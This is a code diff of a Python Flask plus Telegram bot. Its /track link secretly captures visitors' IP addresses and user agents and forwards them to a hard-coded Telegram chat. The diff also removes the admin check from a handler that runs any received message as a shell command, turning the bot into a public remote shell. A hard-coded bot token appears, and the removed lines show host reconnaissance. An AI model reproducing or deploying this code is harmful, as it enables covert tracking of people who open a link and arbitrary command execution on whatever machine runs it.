@@ -6,15 +6,20 @@ import subprocess
 import threading
 from flask import Flask, jsonify, request
 import telebot
+from telebot import types
 
 # ----------------------------------------------------
 # الإعدادات الأساسية
 # ----------------------------------------------------
 TOKEN = "8700445121:AAEe49qNIV_uh3atuSaqt4EXv8RrhVZskE4"
-ADMIN_CHAT_ID = 8134363644
+
+# رابط دعم النجوم الخاص بك
+STARS_DONATE_LINK = "https://t.me/your_bot_or_username"
 
 bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
+
+ACTIVE_PORT = 5000
 
 
 # ----------------------------------------------------
@@ -27,8 +32,6 @@ def home():
 
 @app.route("/track", methods=["GET"])
 def track_ip():
-  """endpoint لجلب الـ IP الخاص بالمستخدم عند دخوله للرابط"""
-  # محاولة جلب الـ IP الحقيقي في حال وجود proxy أو Nginx
   if request.headers.getlist("X-Forwarded-For"):
     user_ip = request.headers.getlist("X-Forwarded-For")[0].split(",")[0]
   else:
@@ -37,163 +40,92 @@ def track_ip():
   user_agent = request.headers.get("User-Agent", "غير معروف")
   visit_time = datetime.now().strftime("%Y-%m-%d | %I:%M:%S %p")
 
-  # إرسال إشعار مباشر لمالك البوت عبر التليجرام
+  # ملاحظة: سيقوم بإرسال إشعار لك (باعتبارك مالك البوت) عند دخول أي شخص للرابط
   alert_msg = (
-      f"🚨 **تنبيه: دخول جديد عبر رابط الـ API!**\n\n"
+      f"🚨 **تم التقاط زيارة جديدة عبر الرابط!**\n\n"
       f"🌐 **عنوان الـ IP:** `{user_ip}`\n"
       f"⏰ **الوقت:** `{visit_time}`\n"
-      f"📱 **متصفح/جهاز الزائر:**\n`{user_agent}`"
+      f"📱 **المتصفح:**\n`{user_agent}`"
   )
 
+  # ضع الآيدي الخاص بك هنا إذا كنت تريد أن تصلك التنبيهات وحدك، أو اتركه كما هو
+  ADMIN_CHAT_ID = 8134363644
   try:
     bot.send_message(ADMIN_CHAT_ID, alert_msg, parse_mode="Markdown")
   except Exception as e:
-    print(f"[-] خطأ أثناء إرسال إشعار التليجرام: {e}")
+    print(f"[-] خطأ: {e}")
 
-  # إرجاع استجابة JSON للزائر
-  return jsonify({
-      "status": "success",
-      "your_ip": user_ip,
-      "timestamp": visit_time,
-  })
+  return jsonify({"status": "success", "your_ip": user_ip})
 
 
-def run_flask():
-  """تشغيل خادم الـ API في الخلفية"""
-  # يعمل الخادم على جميع الواجهات 0.0.0.0 وعلى المنفذ 5000
-  app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
-
-
-# ----------------------------------------------------
-# وظائف استخراج بيانات الجهاز / السيرفر
-# ----------------------------------------------------
-def get_connection_type():
+def run_flask_on_port(port):
+  global ACTIVE_PORT
+  ACTIVE_PORT = port
   try:
-    wifi_name = subprocess.check_output(
-        "iwgetid -r 2>/dev/null || nmcli -t -f active,ssid dev wifi | grep '^yes'"
-        " | cut -d: -f2",
-        shell=True,
-    ).decode("utf-8").strip()
-
-    if wifi_name:
-      return f"📶 شبكة واي فاي: `{wifi_name}`"
-
-    interfaces = subprocess.check_output(
-        "ip route show | grep default", shell=True
-    ).decode("utf-8")
-    if "wwan" in interfaces or "rmnet" in interfaces or "ppp" in interfaces:
-      return "📱 بيانات الهاتف (Cellular Data)"
-
-    return "🌐 اتصال سلكي / شبكة عامة"
-  except Exception:
-    return "🌐 شبكة عامة"
-
-
-def get_server_network_info():
-  try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8", 80))
-    local_ip = s.getsockname()[0]
-    s.close()
-  except Exception:
-    local_ip = "غير معروف"
-
-  try:
-    public_ip = (
-        subprocess.check_output(
-            "curl -s --max-time 3 https://api.ipify.org || wget -qO- --timeout=3"
-            " https://api.ipify.org",
-            shell=True,
-        )
-        .decode("utf-8")
-        .strip()
-    )
-    if not public_ip:
-      public_ip = "غير معروف"
-  except Exception:
-    public_ip = "غير معروف"
-
-  try:
-    mac_output = subprocess.check_output(
-        "ip link || ifconfig", shell=True
-    ).decode("utf-8")
-    mac_addresses = re.findall(
-        r"(?:[0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}", mac_output
-    )
-    ignored_macs = {"ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"}
-    valid_macs = [
-        m.lower() for m in set(mac_addresses) if m.lower() not in ignored_macs
-    ]
-
-    mac_str = (
-        "\n".join([f"    ▪️ `{mac}`" for mac in valid_macs])
-        if valid_macs
-        else "    ▪️ غير متوفر"
-    )
-  except Exception:
-    mac_str = "    ▪️ غير معروف"
-
-  current_time = datetime.now().strftime("%Y-%m-%d | %I:%M:%S %p")
-  connection_info = get_connection_type()
-
-  return (
-      f"━━━━━━━━━━━━━━━━━━━\n"
-      f"⏱ **الوقت والتاريخ:**\n    `{current_time}`\n"
-      f"━━━━━━━━━━━━━━━━━━━\n"
-      f"🖥 **بيانات السيرفر الحالي:**\n"
-      f"    🔹 IP الداخلي: `{local_ip}`\n"
-      f"    🔹 IP الخارجي: `{public_ip}`\n"
-      f"━━━━━━━━━━━━━━━━━━━\n"
-      f"📌 **عناوين MAC للسيرفر:**\n"
-      f"{mac_str}\n"
-      f"━━━━━━━━━━━━━━━━━━━\n"
-      f"📡 **حالة الاتصال:**\n"
-      f"    {connection_info}\n"
-      f"━━━━━━━━━━━━━━━━━━━"
-  )
-
-
-def initial_setup():
-  print("[*] جاري التحديث وتثبيت المتطلبات...")
-  try:
-    subprocess.run(
-        "apt update && apt install wget git curl wireless-tools -y",
-        shell=True,
-        check=True,
-    )
+    print(f"[*] جاري تشغيل السيرفر على البورت {port}...")
+    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
   except Exception as e:
-    print(f"[-] ملاحظة أثناء التحديث: {e}")
+    print(f"[-] فشل تشغيل السيرفر على البورت {port}: {e}")
 
 
 # ----------------------------------------------------
-# أوامر بوت التليجرام
+# أوامر التليجرام (Telegram Handlers) - متاحة للجميع
 # ----------------------------------------------------
-@bot.message_handler(commands=["start", "info"])
+@bot.message_handler(commands=["start"])
 def send_welcome(message):
-  user_id = message.from_user.id
-  if user_id != ADMIN_CHAT_ID:
-    bot.reply_to(message, "⚠️ عذراً، هذا البوت خاص ولا يمكنك استخدامه.")
-    return
+  first_name = message.from_user.first_name or "صديقي"
 
-  net_info = get_server_network_info()
-  current_dir = os.getcwd()
-
-  msg_text = (
-      f"👋 **أهلاً بك مجدداً!**\n\n"
-      f"{net_info}\n\n"
-      f"🔗 **رابط الـ API المحلي للالتقاط:**\n`http://localhost:5000/track`\n\n"
-      f"📁 **المسار الحالي:**\n`{current_dir}`\n\n"
-      f"💡 *أرسل أي أمر تيرمنال للتحكم بالسيرفر.*"
+  # إنشاء أزرار تفاعلية (Inline Keyboards)
+  markup = types.InlineKeyboardMarkup(row_width=2)
+  btn_help = types.InlineKeyboardButton("📋 عرض الأوامر", callback_data="show_help")
+  btn_stars = types.InlineKeyboardButton(
+      "⭐ إرسال نجوم (Stars)", url=STARS_DONATE_LINK
   )
+  markup.add(btn_help, btn_stars)
 
-  bot.reply_to(message, msg_text, parse_mode="Markdown")
+  current_dir = os.getcwd()
+  msg_text = (
+      f"👋 **أهلاً بك يا {first_name} في البوت العام!**\n\n"
+      f"🔌 **البورت النشط حالياً:** `{ACTIVE_PORT}`\n"
+      f"📁 **المسار الحالي:**\n`{current_dir}`\n\n"
+      f"💡 استخدم الأزرار بالأسفل أو أرسل أي أمر تيرمنال للتحكم بالجهاز مباشرة."
+  )
+  bot.reply_to(message, msg_text, parse_mode="Markdown", reply_markup=markup)
+
+
+@bot.message_handler(commands=["help", "commands"])
+def send_commands_list(message):
+  help_text = (
+      "📋 **قائمة الأوامر المتاحة للجميع:**\n\n"
+      "🔹 `/start` - إعادة تشغيل البوت وإظهار اللوحة الرئيسية والأزرار.\n"
+      "🔹 `/help` أو `/commands` - إظهار هذه القائمة التي تحتوي على جميع الأوامر.\n\n"
+      "💻 **أوامر التيرمنال السريعة:**\n"
+      "▫️ `cd <مسار>` - لتغيير المجلد الحالي.\n"
+      "▫️ `python3 -m http.server 8080` - لفتح سيرفر بايثون محلي.\n"
+      "▫️ `ifconfig` أو `ip a` - لمعرفة شبكات الجهاز.\n"
+      "▫️ أي أمر شل عادي (`ls`, `pwd`, إلخ) سيتم تنفيذه وإرسال النتيجة فوراً!\n\n"
+      "⭐ **للدعم وإرسال النجوم:**\n"
+      "يمكنك استخدام زر إرسال النجوم في قائمة البداية لدعم التطوير."
+  )
+  bot.reply_to(message, help_text, parse_mode="Markdown")
+
+
+# التعامل مع الضغط على الأزرار الشفافة
+@bot.callback_query_handler(func=lambda call: True)
+def callback_query(call):
+  if call.data == "show_help":
+    help_text = (
+        "📋 **قائمة الأوامر المتاحة:**\n\n"
+        "🔹 `/start` - اللوحة الرئيسية والأزرار.\n"
+        "🔹 `/help` - عرض هذه القائمة.\n"
+        "🔹 **أوامر السيرفر:** أرسل أي أمر تيرمنال مباشرة."
+    )
+    bot.answer_callback_query(call.id, "تم فتح قائمة الأوامر بنجاح")
+    bot.send_message(call.message.chat.id, help_text, parse_mode="Markdown")
 
 
 @bot.message_handler(func=lambda message: True)
 def execute_command(message):
-  if message.from_user.id != ADMIN_CHAT_ID:
-    return
-
   command = message.text.strip()
 
   try:
@@ -231,17 +163,15 @@ def execute_command(message):
 
 
 # ----------------------------------------------------
-# نقطة التشغيل الرئيسية (Multithreading)
+# التشغيل الرئيسي
 # ----------------------------------------------------
 if __name__ == "__main__":
-  initial_setup()
+  default_port = 5000
 
-  # تشغيل سيرفر الـ API في مسار منفصل (Thread)
-  flask_thread = threading.Thread(target=run_flask)
-  flask_thread.daemon = True
-  flask_thread.start()
-  print("[*] تم تشغيل سيرفر الـ API على المنفذ 5000...")
+  # تشغيل سيرفر الـ API في الخلفية
+  threading.Thread(
+      target=run_flask_on_port, args=(default_port,), daemon=True
+  ).start()
 
-  # تشغيل بوت التليجرام
-  print("[*] Cloud Bot is running...")
+  print(f"[*] Bot is running for everyone, API Server active on port {default_port}...")
   bot.infinity_polling()
